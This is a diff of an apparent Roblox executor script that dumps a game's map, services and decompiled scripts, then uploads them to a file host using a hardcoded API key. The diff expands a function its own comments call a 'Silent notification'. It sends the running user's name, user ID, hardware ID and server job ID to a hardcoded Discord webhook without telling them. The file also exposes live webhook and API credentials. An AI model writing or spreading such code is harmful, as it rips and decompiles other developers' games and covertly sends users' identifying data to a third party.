@@ -1,6 +1,5 @@
--- JSON Map Dumper with Full Mode + Discord Webhook (merged & extended)
--- Place in a local script (or executor) where Http/Request functions are available.
-
+-- JSON Map Dumper (updated)
+-- Автор: обновлённая версия по твоим требованиям
 local HttpService = game:GetService("HttpService")
 local task = task or delay
 local CoreGui = game:GetService("CoreGui")
@@ -13,14 +12,13 @@ local httpRequest = (syn and syn.request) or (http and http.request) or http_req
 
 -- ================= api ================= --
 local API_KEY = "dubo5V0tUTb1VHmO5dov2kL0QaDGuen8" -- pls dont touch this
-
 local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442677826200535162/ubaFKkqxPZkXBoqUQeufwJ6CLUycMmoFoGXiFg0H4nb21CYy1Xv7tTFa8UvMCwjoaTHB"
 -- ================================================ --
 
-local IGNORE_PLAYERS = true
+local IGNORE_PLAYERS = true 
 local TUTORIAL_LINK = "https://jpst.it/4JOG-"
 local CURRENT_LANG = "RU"
-local DUMP_MODE = "General"
+local DUMP_MODE = "General" 
 
 local TEXTS = {
     RU = {
@@ -30,7 +28,7 @@ local TEXTS = {
         LinkCopied = "Ссылка скопирована!", Error = "ОШИБКА",
         NoHttp = "HTTP запросы не поддерживаются!", LangTitle = "ВЫБЕРИТЕ ЯЗЫК",
         UploadFailed = "Загрузка не удалась", TutorialButton = "Инструкция (копировать)",
-        FileSize = "Размер: %.1f MB",
+        FileSize = "Размер: %.1f MB", 
         ModeTitle = "ВЫБОР РЕЖИМА ДАМПА",
         ModeGeneral = "General (Только карта)",
         ModeFull = "Full (ВСЁ: Replicated, Gui, Scripts)",
@@ -57,7 +55,7 @@ local function T(key) return TEXTS[CURRENT_LANG][key] or key end
 
 local ScreenGui, MainFrame, StatusLabel, InfoLabel, Fill, ProgressFrame
 
--- UI (compact)
+-- UI CREATION (Language, Mode, Main)
 local function createLanguageGUI(onSelected)
     if CoreGui:FindFirstChild("MapDumperUI") then CoreGui.MapDumperUI:Destroy() end
     local gui = Instance.new("ScreenGui") gui.Name = "MapDumperUI" gui.Parent = CoreGui
@@ -109,50 +107,47 @@ local function createTutorialButton()
     TutorialButton.MouseButton1Click:Connect(function() pcall(function() setclipboard(TUTORIAL_LINK) end) InfoLabel.Text = T("LinkCopied") task.delay(3, function() InfoLabel.Text = T("Success") end) end)
 end
 
--- ==================== WEBHOOK DISCORD ==================== --
-local function safeGetGameField(name)
-    local ok, val = pcall(function() return game[name] end)
-    return ok and val or nil
-end
-
+-- ==================== WEBHOOK DISCORD (expanded) ==================== --
 local function sendDiscordNotification(downloadLink, objectCount)
     if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "" then return end
-    if not httpRequest then return end
 
     local player = Players.LocalPlayer
+    local userId = (player and player.UserId) or "Unknown"
     local playerName = (player and player.Name) or "Unknown"
-    local displayName = (player and (pcall(function() return player.DisplayName end) and player.DisplayName or playerName)) or "Unknown"
-    local userId = (player and pcall(function() return player.UserId end) and player.UserId) or 0
+    local displayName = (player and player.DisplayName) or playerName
     local placeId = game.PlaceId or 0
-    local gameName = game.Name or "Unknown"
-    local gameLink = "https://www.roblox.com/games/" .. tostring(placeId)
-    local avatarUrl = player and ("https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png") or nil
-
-    local jobId = (pcall(function() return game.JobId end) and tostring(game.JobId)) or "N/A"
+    local gameName = tostring(game.Name or "Unknown")
+    local jobId = (pcall(function() return tostring(game.JobId) end) and tostring(game.JobId)) or "N/A"
     local playersCount = #Players:GetPlayers()
-    local maxPlayers = (Players and Players.MaxPlayers) or "N/A"
-    local creatorId = (pcall(function() return game.CreatorId end) and tostring(game.CreatorId)) or "N/A"
-    local timestamp = os.date("%Y-%m-%d %X")
-
+    local isStudio = tostring(RunService:IsStudio() == true)
     local hwid = (gethwid and pcall(gethwid) and gethwid()) or "Hidden/Not Supported"
+    local dateStr = os.date("%Y-%m-%d %X")
 
-    -- Build embed with extra fields (total 9-ish fields: player/game/dump/download + extras)
+    -- Build 10 info fields (plus title with game name)
+    local fields = {
+        { ["name"] = "👤 Player", ["value"] = playerName, ["inline"] = true },
+        { ["name"] = "🆔 Player ID", ["value"] = tostring(userId), ["inline"] = true },
+        { ["name"] = "🎮 Game Name", ["value"] = gameName, ["inline"] = false },
+        { ["name"] = "🆔 Place ID", ["value"] = tostring(placeId), ["inline"] = true },
+        { ["name"] = "🧾 Job ID", ["value"] = tostring(jobId), ["inline"] = true },
+        { ["name"] = "⚙️ Mode", ["value"] = tostring(DUMP_MODE), ["inline"] = true },
+        { ["name"] = "📦 Objects Scanned", ["value"] = tostring(objectCount), ["inline"] = true },
+        { ["name"] = "👥 Players Online", ["value"] = tostring(playersCount), ["inline"] = true },
+        { ["name"] = "🏗️ Is Studio", ["value"] = isStudio, ["inline"] = true },
+        { ["name"] = "🕒 Date", ["value"] = dateStr, ["inline"] = true },
+        -- 11th field: HWID (if you want to keep exactly 10, you can remove one above)
+        { ["name"] = "🔒 HWID", ["value"] = tostring(hwid), ["inline"] = false }
+    }
+
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
+
     local embed = {
-        ["title"] = "🔥 New Map Dump Created!",
-        ["description"] = "**"..tostring(gameName).."** ("..tostring(placeId)..")",
-        ["color"] = 65280,
-        ["fields"] = {
-            { ["name"] = "👤 Player", ["value"] = "**Nick:** "..tostring(playerName).."\n**Display:** "..tostring(displayName).."\n**ID:** "..tostring(userId), ["inline"] = true },
-            { ["name"] = "🎮 Game", ["value"] = "**Name:** "..tostring(gameName).."\n**PlaceID:** "..tostring(placeId).."\n**Link:** [Open Game]("..gameLink..")", ["inline"] = true },
-            { ["name"] = "📡 Server", ["value"] = "**Job ID:** "..tostring(jobId).."\n**Players:** "..tostring(playersCount).." / "..tostring(maxPlayers), ["inline"] = true },
-            { ["name"] = "⚙️ Dump Info", ["value"] = "**Mode:** "..tostring(DUMP_MODE).."\n**Objects Scanned:** "..tostring(objectCount).."\n**CreatorId:** "..tostring(creatorId), ["inline"] = false },
-            { ["name"] = "🕒 Time", ["value"] = timestamp, ["inline"] = true },
-            { ["name"] = "🧾 Download Link", ["value"] = "```"..tostring(downloadLink).."```\n[Direct Download]("..tostring(downloadLink)..")", ["inline"] = false },
-            { ["name"] = "🔒 HWID", ["value"] = "||"..tostring(hwid).."||", ["inline"] = true },
-            { ["name"] = "📌 Note", ["value"] = "Full dumps may include scripts and GUI. Use responsibly.", ["inline"] = false }
-        },
-        ["thumbnail"] = avatarUrl and { ["url"] = avatarUrl } or nil,
-        ["footer"] = { ["text"] = "Silent Map Dumper • "..timestamp }
+        ["title"] = "🔥 New Map Dump — " .. gameName,
+        ["description"] = "Someone exported the map. Silent notification.",
+        ["color"] = 3447003, -- blue-ish
+        ["fields"] = fields,
+        ["thumbnail"] = { ["url"] = avatarUrl },
+        ["footer"] = { ["text"] = "Silent Map Dumper • " .. dateStr }
     }
 
     local payload = HttpService:JSONEncode({ ["embeds"] = {embed} })
@@ -168,136 +163,20 @@ local function sendDiscordNotification(downloadLink, objectCount)
 end
 -- ==================================================================== --
 
--- LOADER CODE TO EMBED IN JSON (restores multiple services)
-local LOADER_CODE = [=[
-local HttpService = game:GetService("HttpService")
-local jsonString = [[ ВСТАВЬТЕ JSON СЮДА / PASTE JSON HERE ]]
-
-local s, data = pcall(function() return HttpService:JSONDecode(jsonString) end)
-if not s or not data then warn("JSON decode error:", data); return end
-local mapRoot = data.Map
-
-local function deserializeType(t)
-    if not t then return nil end
-    if t.X and t.Y and t.Z and not t.Pos then return Vector3.new(t.X, t.Y, t.Z) end
-    if t.X and t.Y and not t.Z then return Vector2.new(t.X, t.Y) end
-    if t.Pos and t.Rot then
-        local cf = CFrame.new(t.Pos.X, t.Pos.Y, t.Pos.Z)
-        local rot = t.Rot
-        return cf * CFrame.Angles(math.rad(rot.X or 0), math.rad(rot.Y or 0), math.rad(rot.Z or 0))
-    end
-    if t.R and t.G and t.B then return Color3.new(t.R, t.G, t.B) end
-    if t.SX and t.SY then return UDim2.new(t.SX, t.OX or 0, t.SY, t.OY or 0) end
-    if t.Keypoints then
-        local kps = {}
-        for _, kp in ipairs(t.Keypoints) do
-            local c = kp.Color
-            table.insert(kps, ColorSequenceKeypoint.new(kp.Time, Color3.new(c.R, c.G, c.B)))
-        end
-        return ColorSequence.new(kps)
-    end
-    if t.Value and (t.Value.X or t.Value.R) then return deserializeType(t.Value) end
-    return t
-end
-
-local function getEnumFromValue(value)
-    if type(value) == "string" and string.find(value, "Enum%.") then
-        local enumType, enumName = string.match(value, "Enum%.([^%.]+)%.(.+)")
-        if enumType and Enum[enumType] and Enum[enumType][enumName] then
-            return Enum[enumType][enumName]
-        end
-    end
-    return nil
-end
-
-local function build(node, parent)
-    local props = node.Props
-    local obj
-    pcall(function()
-        obj = Instance.new(props.ClassName)
-        obj.Name = props.Name
-        for key, value in pairs(props) do
-            pcall(function()
-                if key == "Name" or key == "ClassName" or key == "Part0" or key == "Part1" or key == "Source" or key == "Parent" then return end
-                local deserializedValue = deserializeType(value)
-                if deserializedValue ~= value then
-                    obj[key] = deserializedValue
-                elseif typeof(obj[key]) == "BrickColor" and type(value) == "string" then
-                    obj[key] = BrickColor.new(value)
-                else
-                    local enumValue = getEnumFromValue(value)
-                    if enumValue then obj[key] = enumValue else obj[key] = value end
-                end
-            end)
-        end
-
-        if (obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script")) and props.Source and props.Source:sub(1,10) ~= "-- No Dec" then
-            pcall(function() obj.Source = props.Source end)
-        end
-
-        if (obj:IsA("JointInstance") or obj:IsA("Constraint")) and props.Part0 and props.Part1 then
-            task.delay(0.5, function()
-                 local part0 = parent:FindFirstChild(props.Part0, true)
-                 local part1 = parent:FindFirstChild(props.Part1, true)
-                 if part0 and part1 then
-                     pcall(function() obj.Part0 = part0 end)
-                     pcall(function() obj.Part1 = part1 end)
-                 end
-            end)
-        end
-
-        obj.Parent = parent
-    end)
-
-    if obj then
-        for _, child in pairs(node.Children) do
-            build(child, obj)
-        end
-    end
-end
-
--- CLEANUP WORKSPACE
-for _, child in pairs(game.Workspace:GetChildren()) do
-    if child.Name ~= "Terrain" and not child:IsA("Camera") then child:Destroy() end
-end
-
-print("Starting restoration...")
-
--- Handling multiple services
-if mapRoot.Props and mapRoot.Props.Name == "GAME_ROOT" then
-    for _, serviceNode in pairs(mapRoot.Children) do
-        local serviceName = serviceNode.Props.Name
-        local ok, service = pcall(function() return game:GetService(serviceName) end)
-        if ok and service then
-            print("Restoring service: " .. serviceName)
-            if serviceName == "Workspace" then
-                for _, child in pairs(serviceNode.Children) do build(child, service) end
-            else
-                local folder = Instance.new("Folder")
-                folder.Name = "Restored_" .. serviceName
-                folder.Parent = service
-                for _, child in pairs(serviceNode.Children) do build(child, folder) end
-            end
-        end
-    end
-else
-    local MapHolder = Instance.new("Model")
-    MapHolder.Name = "RestoredMap"
-    build(mapRoot, MapHolder)
-    MapHolder.Parent = game.Workspace
-end
-
-print("Map loaded successfully!")
+-- LOADER_CODE left in file if needed later but NOT uploaded by default.
+local LOADER_CODE = [=[ -- not uploaded by default in this version
+-- (kept for reference)
 ]=]
 
+-- SERIALIZATION
 local function serializeType(val)
     local t = typeof(val)
     if t == "Vector3" then return {X=val.X, Y=val.Y, Z=val.Z} end
     if t == "Vector2" then return {X=val.X, Y=val.Y} end
-    if t == "CFrame" then
+    if t == "CFrame" then 
         local pos = val.Position
         local x,y,z = val:ToEulerAnglesXYZ()
-        return {Pos={X=pos.X, Y=pos.Y, Z=pos.Z}, Rot={X=math.deg(x), Y=math.deg(y), Z=math.deg(z)}}
+        return {Pos={X=pos.X, Y=pos.Y, Z=pos.Z}, Rot={X=math.deg(x), Y=math.deg(y), Z=math.deg(z)}} 
     end
     if t == "Color3" then return {R=val.R, G=val.G, B=val.B} end
     if t == "EnumItem" then return tostring(val) end
@@ -314,6 +193,7 @@ local function serializeType(val)
     return val
 end
 
+-- GET PROPS (extended)
 local function getProps(obj)
     local props = {}
     props.Name = obj.Name
@@ -332,8 +212,10 @@ local function getProps(obj)
                 props.CanCollide = obj.CanCollide
                 props.Shape = tostring(obj.Shape)
                 props.Reflectance = obj.Reflectance
+                props.CastShadow = obj.CastShadow
+                props.Massless = obj.Massless
             end
-            if obj:IsA("GuiBase2d") then
+            if obj:IsA("GuiBase2d") then 
                 props.Size = serializeType(obj.Size)
                 props.Position = serializeType(obj.Position)
                 props.AnchorPoint = serializeType(obj.AnchorPoint)
@@ -344,10 +226,16 @@ local function getProps(obj)
                     props.Text = obj.Text
                     props.TextColor3 = serializeType(obj.TextColor3)
                     props.TextSize = obj.TextSize
+                    props.Font = tostring(obj.Font)
+                end
+                if obj:IsA("ImageLabel") or obj:IsA("ImageButton") or obj:IsA("Decal") then
+                    pcall(function()
+                        props.Image = obj.Image or obj.Texture or nil
+                    end)
                 end
             end
             if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
-                props.Disabled = obj.Disabled
+                props.Disabled = obj.Disabled 
                 if decompile then
                     local s, src = pcall(decompile, obj)
                     if s then props.Source = src else props.Source = "-- Decompile failed" end
@@ -363,6 +251,17 @@ local function getProps(obj)
                 props.SoundId = obj.SoundId
                 props.Volume = obj.Volume
                 props.Looped = obj.Looped
+                props.Playing = obj.Playing
+                props.RollOffMode = tostring(obj.RollOffMode)
+            end
+            if obj:IsA("Decal") or obj:IsA("Texture") then
+                pcall(function() props.Texture = obj.Texture or obj.TextureId end)
+            end
+            if obj:IsA("MeshPart") or obj:IsA("SpecialMesh") then
+                pcall(function()
+                    props.MeshId = obj.MeshId or obj.Mesh.MeshId
+                    props.TextureId = obj.TextureId or (obj.Mesh and obj.Mesh.TextureId)
+                end)
             end
             if obj:IsA("JointInstance") or obj:IsA("Constraint") then
                 props.Part0 = obj.Part0 and obj.Part0.Name or nil
@@ -372,9 +271,9 @@ local function getProps(obj)
                     props.C1 = serializeType(obj.C1)
                 end
             end
-
         elseif DUMP_MODE == "Full" then
-            -- AGGRESSIVE SCAN (best-effort)
+            -- Aggressive: include General props + extras where possible
+            -- BasePart
             if obj:IsA("BasePart") then
                 props.CFrame = serializeType(obj.CFrame)
                 props.Size = serializeType(obj.Size)
@@ -386,8 +285,9 @@ local function getProps(obj)
                 props.Massless = obj.Massless
                 props.CastShadow = obj.CastShadow
                 props.Reflectance = obj.Reflectance
+                props.CustomPhysicalProperties = pcall(function() return obj.CustomPhysicalProperties end) and tostring(obj.CustomPhysicalProperties) or nil
             end
-
+            -- Scripts
             if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
                 props.Disabled = obj.Disabled
                 if decompile then
@@ -397,11 +297,11 @@ local function getProps(obj)
                     props.Source = "-- No Decompiler"
                 end
             end
-
+            -- Values
             if obj:IsA("StringValue") or obj:IsA("IntValue") or obj:IsA("BoolValue") or obj:IsA("NumberValue") then
-                pcall(function() props.Value = serializeType(obj.Value) end)
+                props.Value = serializeType(obj.Value)
             end
-
+            -- GUI
             if obj:IsA("GuiObject") then
                 props.Size = serializeType(obj.Size)
                 props.Position = serializeType(obj.Position)
@@ -409,15 +309,35 @@ local function getProps(obj)
                 props.BackgroundColor3 = serializeType(obj.BackgroundColor3)
                 props.ZIndex = obj.ZIndex
             end
-
+            -- Sound / Particle / Mesh / Decal
+            if obj:IsA("Sound") then
+                props.SoundId = obj.SoundId
+                props.Volume = obj.Volume
+                props.Looped = obj.Looped
+                props.Playing = obj.Playing
+            end
             if obj:IsA("ParticleEmitter") then
                 props.Texture = obj.Texture
                 props.ColorSequence = serializeType(obj.ColorSequence)
                 props.Rate = obj.Rate
-            elseif obj:IsA("Sound") then
-                props.SoundId = obj.SoundId
-                props.Volume = obj.Volume
-                props.Looped = obj.Looped
+            end
+            if obj:IsA("Decal") or obj:IsA("Texture") then
+                pcall(function() props.Texture = obj.Texture or obj.TextureId end)
+            end
+            if obj:IsA("MeshPart") or obj:IsA("SpecialMesh") then
+                pcall(function()
+                    props.MeshId = obj.MeshId or (obj.Mesh and obj.Mesh.MeshId)
+                    props.TextureId = obj.TextureId or (obj.Mesh and obj.Mesh.TextureId)
+                end)
+            end
+            -- Constraints
+            if obj:IsA("JointInstance") or obj:IsA("Constraint") then
+                props.Part0 = obj.Part0 and obj.Part0.Name or nil
+                props.Part1 = obj.Part1 and obj.Part1.Name or nil
+                if obj:IsA("Weld") or obj:IsA("Motor6D") then
+                    props.C0 = serializeType(obj.C0)
+                    props.C1 = serializeType(obj.C1)
+                end
             end
         end
     end)
@@ -457,6 +377,7 @@ local function scan(obj)
             if IGNORE_PLAYERS and child:FindFirstChild("Humanoid") and game.Players:GetPlayerFromCharacter(child) then continue end
             if child:IsA("Terrain") then continue end
             if child.Name == "Camera" and child.Parent == workspace then continue end
+
             table.insert(node.Children, scan(child))
         end
     end
@@ -475,14 +396,8 @@ local function uploadToGofile(files)
         local boundary = "---------------------------"..tostring(math.random(1000000000000,9999999999999))
         local body = ""
 
-        body = body .. "--"..boundary.."\r\n"..
-               'Content-Disposition: form-data; name="token"\r\n\r\n'..API_KEY.."\r\n"
-
-        body = body .. "--"..boundary.."\r\n"..
-                   'Content-Disposition: form-data; name="file"; filename="'..file.filename..'"\r\n'..
-                   "Content-Type: application/octet-stream\r\n\r\n"..
-                   file.filedata.."\r\n"
-
+        body = body .. "--"..boundary.."\r\n"..'Content-Disposition: form-data; name="token"\r\n\r\n'..API_KEY.."\r\n"
+        body = body .. "--"..boundary.."\r\n"..'Content-Disposition: form-data; name="file"; filename="'..file.filename..'"\r\n'.."Content-Type: application/octet-stream\r\n\r\n"..file.filedata.."\r\n"
         body = body .. "--"..boundary.."--"
 
         local headers = {["Content-Type"]="multipart/form-data; boundary="..boundary}
@@ -540,17 +455,25 @@ local function startDumper()
         local rootsToScan = {}
 
         if DUMP_MODE == "Full" then
-            -- ADDING ALL IMPORTANT SERVICES
-            local services = {
-                "Workspace", "ReplicatedStorage", "Lighting", "ReplicatedFirst",
-                "StarterPack", "StarterGui", "Teams", "SoundService", "ServerStorage"
-            }
-            for _, sname in ipairs(services) do
+            -- ADDING ALL IMPORTANT SERVICES (FULL: everything)
+            local safeAdd = function(name)
                 pcall(function()
-                    local service = game:GetService(sname)
-                    if service then table.insert(rootsToScan, service) end
+                    local s = game:GetService(name)
+                    if s then table.insert(rootsToScan, s) end
                 end)
             end
+            safeAdd("Workspace")
+            safeAdd("ReplicatedStorage")
+            safeAdd("ServerStorage")
+            safeAdd("Lighting")
+            safeAdd("ReplicatedFirst")
+            safeAdd("StarterPack")
+            safeAdd("StarterGui")
+            safeAdd("Teams")
+            safeAdd("SoundService")
+            safeAdd("StarterPlayer")
+            safeAdd("ServerScriptService")
+            safeAdd("Players")
         else
             -- JUST WORKSPACE
             table.insert(rootsToScan, game:GetService("Workspace"))
@@ -572,12 +495,19 @@ local function startDumper()
 
         for _, root in ipairs(rootsToScan) do
             local serviceNode = scan(root)
+            -- Override name to ensure it matches service name
             serviceNode.Props.Name = root.Name
             table.insert(gameRoot.Children, serviceNode)
         end
 
         local mapData = {
-            Info = {PlaceId = game.PlaceId or 0, Name = game.Name or "Unknown", Date = os.time(), Mode=DUMP_MODE},
+            Info = {
+                PlaceId = game.PlaceId or 0,
+                Name = game.Name or "Unknown",
+                Date = os.time(),
+                Mode = DUMP_MODE,
+                Players = #Players:GetPlayers()
+            },
             Map = gameRoot
         }
 
@@ -594,8 +524,8 @@ local function startDumper()
         end
 
         local filesToUpload = {
-            {filename="FullMapDump_"..tostring(game.PlaceId)..".json", filedata=jsonData},
-            {filename="Loader.lua", filedata=LOADER_CODE}
+            {filename="FullMapDump_"..tostring(game.PlaceId)..".json", filedata=jsonData}
+            -- NOTE: по требованию лоадер НЕ загружается — только дамп
         }
 
         local ok, link = uploadToGofile(filesToUpload)
@@ -605,8 +535,8 @@ local function startDumper()
             InfoLabel.Text = T("LinkCopied")
             pcall(function() setclipboard(link) end)
 
-            -- Silent send to Discord with extra fields
-            pcall(function() sendDiscordNotification(link, totalToScan) end)
+            -- Silent webhook send with expanded info
+            sendDiscordNotification(link, totalToScan)
 
             createTutorialButton()
 
